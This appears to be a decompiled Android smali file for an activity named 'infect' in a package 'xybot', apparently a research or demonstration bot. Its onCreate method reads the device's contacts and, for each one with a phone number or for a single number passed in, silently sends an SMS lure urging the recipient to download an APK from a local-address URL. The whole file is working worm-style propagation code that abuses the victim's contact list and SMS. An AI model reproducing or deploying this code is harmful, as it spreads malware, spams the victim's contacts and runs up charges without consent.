.class public Lcom/xybot/infect;
.super Landroid/app/Activity;
.source "infect.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 18
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method


# virtual methods
.method public onCreate(Landroid/os/Bundle;)V
    .locals 24
    .parameter "savedInstanceState"

    .prologue
    .line 22
    invoke-super/range {p0 .. p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 24
    invoke-virtual/range {p0 .. p0}, Lcom/xybot/infect;->getWindow()Landroid/view/Window;

    move-result-object v4

    const/16 v6, 0x10

    invoke-virtual {v4, v6}, Landroid/view/Window;->addFlags(I)V

    .line 27
    invoke-virtual/range {p0 .. p0}, Lcom/xybot/infect;->getIntent()Landroid/content/Intent;

    move-result-object v4

    invoke-virtual {v4}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v12

    .line 28
    .local v12, bundle:Landroid/os/Bundle;
    const-string v4, "inf"

    invoke-virtual {v12, v4}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    .line 29
    .local v7, str:Ljava/lang/String;
    const-string v4, "message"

    invoke-static {v4, v7}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 32
    const-string v4, "all"

    invoke-virtual {v7, v4}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v4

    if-eqz v4, :cond_3

    .line 34
    const/16 v22, 0x0

    .line 35
    .local v22, phoneNumber:Ljava/lang/String;
    const/16 v17, 0x0

    .local v17, i:I
    const/16 v19, 0x0

    .line 38
    .local v19, j:I
    invoke-virtual/range {p0 .. p0}, Lcom/xybot/infect;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v1

    .line 39
    .local v1, cr:Landroid/content/ContentResolver;
    new-instance v21, Ljava/util/ArrayList;

    invoke-direct/range {v21 .. v21}, Ljava/util/ArrayList;-><init>()V

    .line 40
    .local v21, nameValuePairs:Ljava/util/List;
    new-instance v18, Landroid/content/Intent;

    const-string v4, "android.intent.action.PICK"

    sget-object v6, Landroid/provider/ContactsContract$Contacts;->CONTENT_URI:Landroid/net/Uri;

    move-object/from16 v0, v18

    invoke-direct {v0, v4, v6}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    .line 41
    .local v18, intent:Landroid/content/Intent;
    invoke-virtual/range {v18 .. v18}, Landroid/content/Intent;->getData()Landroid/net/Uri;

    move-result-object v2

    const/4 v3, 0x0

    const/4 v4, 0x0

    const/4 v5, 0x0

    const/4 v6, 0x0

    invoke-virtual/range {v1 .. v6}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v14

    .line 43
    .end local v7           #str:Ljava/lang/String;
    .local v14, cursor:Landroid/database/Cursor;
    :cond_0
    :goto_0
    :try_start_0
    invoke-interface {v14}, Landroid/database/Cursor;->moveToNext()Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result v4

    if-nez v4, :cond_1

    .line 75
    .end local v1           #cr:Landroid/content/ContentResolver;
    .end local v14           #cursor:Landroid/database/Cursor;
    .end local v17           #i:I
    .end local v18           #intent:Landroid/content/Intent;
    .end local v19           #j:I
    .end local v21           #nameValuePairs:Ljava/util/List;
    .end local v22           #phoneNumber:Ljava/lang/String;
    :goto_1
    invoke-virtual/range {p0 .. p0}, Lcom/xybot/infect;->finish()V

    .line 76
    return-void

    .line 44
    .restart local v1       #cr:Landroid/content/ContentResolver;
    .restart local v14       #cursor:Landroid/database/Cursor;
    .restart local v17       #i:I
    .restart local v18       #intent:Landroid/content/Intent;
    .restart local v19       #j:I
    .restart local v21       #nameValuePairs:Ljava/util/List;
    .restart local v22       #phoneNumber:Ljava/lang/String;
    :cond_1
    :try_start_1
    const-string v4, "_id"

    invoke-interface {v14, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {v14, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v13

    .line 45
    .local v13, contactId:Ljava/lang/String;
    const-string v4, "display_name"

    invoke-interface {v14, v4}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v4

    invoke-interface {v14, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v20

    .line 46
    .local v20, name:Ljava/lang/String;
    const-string v4, "has_phone_number"

    invoke-interface {v14, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {v14, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v16

    .line 47
    .local v16, hasPhone:Ljava/lang/String;
    const-string v4, "1"

    move-object/from16 v0, v16

    invoke-virtual {v0, v4}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v4

    if-eqz v4, :cond_0

    .line 48
    invoke-virtual/range {p0 .. p0}, Lcom/xybot/infect;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v2

    sget-object v3, Landroid/provider/ContactsContract$CommonDataKinds$Phone;->CONTENT_URI:Landroid/net/Uri;

    const/4 v4, 0x0

    new-instance v6, Ljava/lang/StringBuilder;

    const-string v8, "contact_id = "

    invoke-direct {v6, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v6, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    const/4 v6, 0x0

    const/4 v7, 0x0

    invoke-virtual/range {v2 .. v7}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    move-result-object v23

    .line 49
    .local v23, phones:Landroid/database/Cursor;
    const/16 v17, 0x0

    move-object/from16 v3, v22

    .line 50
    .end local v22           #phoneNumber:Ljava/lang/String;
    .local v3, phoneNumber:Ljava/lang/String;
    :goto_2
    :try_start_2
    invoke-interface/range {v23 .. v23}, Landroid/database/Cursor;->moveToNext()Z

    move-result v4

    if-nez v4, :cond_2

    move-object/from16 v22, v3

    .end local v3           #phoneNumber:Ljava/lang/String;
    .restart local v22       #phoneNumber:Ljava/lang/String;
    goto :goto_0

    .line 52
    .end local v22           #phoneNumber:Ljava/lang/String;
    .restart local v3       #phoneNumber:Ljava/lang/String;
    :cond_2
    const-string v4, "data1"

    move-object/from16 v0, v23

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    move-object/from16 v0, v23

    invoke-interface {v0, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v3

    .line 53
    const-string v5, "This is an awesome app, you should download it as soon as possible !! http://10.0.2.2/~subho_halder/app.apk"

    .line 54
    .local v5, sms:Ljava/lang/String;
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v2

    .line 55
    .local v2, smsMgr:Landroid/telephony/SmsManager;
    const/4 v4, 0x0

    const/4 v6, 0x0

    const/4 v7, 0x0

    invoke-virtual/range {v2 .. v7}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    .line 56
    const-string v4, "message sent to"

    invoke-static {v4, v3}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    .line 57
    add-int/lit8 v17, v17, 0x1

    goto :goto_2

    .line 61
    .end local v2           #smsMgr:Landroid/telephony/SmsManager;
    .end local v3           #phoneNumber:Ljava/lang/String;
    .end local v5           #sms:Ljava/lang/String;
    .end local v13           #contactId:Ljava/lang/String;
    .end local v16           #hasPhone:Ljava/lang/String;
    .end local v20           #name:Ljava/lang/String;
    .end local v23           #phones:Landroid/database/Cursor;
    .restart local v22       #phoneNumber:Ljava/lang/String;
    :catch_0
    move-exception v15

    move-object/from16 v3, v22

    .line 62
    .end local v22           #phoneNumber:Ljava/lang/String;
    .restart local v3       #phoneNumber:Ljava/lang/String;
    .local v15, e:Ljava/lang/Exception;
    :goto_3
    invoke-virtual {v15}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_1

    .line 68
    .end local v1           #cr:Landroid/content/ContentResolver;
    .end local v3           #phoneNumber:Ljava/lang/String;
    .end local v14           #cursor:Landroid/database/Cursor;
    .end local v15           #e:Ljava/lang/Exception;
    .end local v17           #i:I
    .end local v18           #intent:Landroid/content/Intent;
    .end local v19           #j:I
    .end local v21           #nameValuePairs:Ljava/util/List;
    .restart local v7       #str:Ljava/lang/String;
    :cond_3
    const-string v5, "This is an awesome app, you should download it as soon as possible !! http://10.0.2.2/~subho_halder/app.apk"

    .line 69
    .restart local v5       #sms:Ljava/lang/String;
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v2

    .line 72
    .restart local v2       #smsMgr:Landroid/telephony/SmsManager;
    const/4 v8, 0x0

    const/4 v10, 0x0

    const/4 v11, 0x0

    move-object v6, v2

    move-object v9, v5

    invoke-virtual/range {v6 .. v11}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    .line 73
    const-string v4, "message sent to"

    invoke-static {v4, v7}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    goto/16 :goto_1

    .line 61
    .end local v2           #smsMgr:Landroid/telephony/SmsManager;
    .end local v5           #sms:Ljava/lang/String;
    .end local v7           #str:Ljava/lang/String;
    .restart local v1       #cr:Landroid/content/ContentResolver;
    .restart local v3       #phoneNumber:Ljava/lang/String;
    .restart local v13       #contactId:Ljava/lang/String;
    .restart local v14       #cursor:Landroid/database/Cursor;
    .restart local v16       #hasPhone:Ljava/lang/String;
    .restart local v17       #i:I
    .restart local v18       #intent:Landroid/content/Intent;
    .restart local v19       #j:I
    .restart local v20       #name:Ljava/lang/String;
    .restart local v21       #nameValuePairs:Ljava/util/List;
    .restart local v23       #phones:Landroid/database/Cursor;
    :catch_1
    move-exception v15

    goto :goto_3
.end method
